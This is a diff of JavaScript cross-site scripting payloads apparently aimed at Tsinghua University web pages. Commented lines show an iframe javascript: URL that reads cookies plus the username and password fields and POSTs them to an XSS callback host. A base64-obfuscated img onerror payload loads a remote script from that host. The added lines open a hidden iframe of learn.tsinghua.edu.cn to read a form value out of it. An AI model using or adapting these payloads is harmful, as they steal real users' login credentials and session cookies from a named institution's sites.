@@ -57,3 +57,10 @@ document.children[0].appendChild(ele2)
 // <iframe src="http://net.tsinghua.edu.cn/wireless/?url=javascript:(cdt=document.cookie,uname=document.getElementById('uname').value,pass=document.getElementById('pass').value,xmlHttp=new XMLHttpRequest(),xmlHttp.open('POST', 'https://igoodvegetable.xss.ht/page_callback', true),xmlHttp.setRequestHeader('Content-type', 'text/plain'),xmlHttp.send(JSON.stringify({'page_html': cdt, 'uri': uname+', '+pass})))" style="display: none"/>
 
 // </textarea><img style="display:none" src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaWdvb2R2ZWdldGFibGUueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>
+
+var ele3 = document.createElement('IFRAME')
+ele3.src = "http://learn.tsinghua.edu.cn"
+ele3.id = "test3"
+ele3.style = "display: none"
+document.children[0].appendChild(ele3)
+setTimeout(()=>{alert(document.getElementById('test3').contentDocument.body.children[1].children[0].children[0].children[1].children[1].children[0].children[0].children[0].children[0].children[0].children[0].children[0].children[0].value)}, 1000)
